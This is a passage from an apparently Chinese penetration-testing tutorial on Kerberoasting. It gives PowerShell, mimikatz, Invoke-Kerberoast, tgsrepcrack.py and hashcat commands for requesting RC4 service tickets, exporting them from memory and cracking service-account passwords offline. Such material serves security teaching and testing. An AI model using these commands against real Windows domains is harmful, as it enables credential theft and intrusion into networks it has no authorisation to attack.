在 KRB_TGS _REP 中，TGS 会返回给 Client 一张票据 ST，而 ST 是由 Client 请求的 Server 端密码进行加密的。当 Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client 端获取的票据 ST，从而获得 Server 端的密码。

（1）申请 TGS

```powershell
PS>Add-Type -AssemblyName System.IdentityModel
PS>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/WebDemo_PC.rcoil.me"
```

这一整个过程是通过 AS-REQ、AS-REP、TGS-REQ、TGS-REP 这四个认证流程，最终获取到 RC4 方式的加密票据。

（2）获取 TGS-REP

Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。

使用 mimikatz 的 kerberos::list /export 导出。

（3）爆破 TGS-REP

可选择工具:

- tgsrepcrack.py (kerberoast 套装)

  ```cmd
  python tgsrepcrack.py password.txt tgs.kirbi
  ```
- hashcat (密码破解全能工具，kali 自带)
  Empire\Invoke-Kerberoast.ps1：
  ```Powershell
  Invoke-Kerberoast -Outputformat Hashcat | fl > test1.txt
  ```
  使用 HASHCAT 工具进行破解：
  ```cmd
  hashcat64.exe –m 13100 test1.txt password.list –force
  ```




**- 参考 -**

\[1\] 《内网安全攻防：渗透测试实战指南》

\[2\] [域渗透——Pass The Hash的实现](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/)
\[3\] [彻底理解Windows认证 - 议题解读](https://payloads.online/archivers/2018-11-30/1)
\[4\] [域渗透——DCSync](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/)
\[5\] [【域渗透】SPN 扫描利用](https://rcoil.me/2019/06/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91SPN%20%E6%89%AB%E6%8F%8F%E5%88%A9%E7%94%A8/)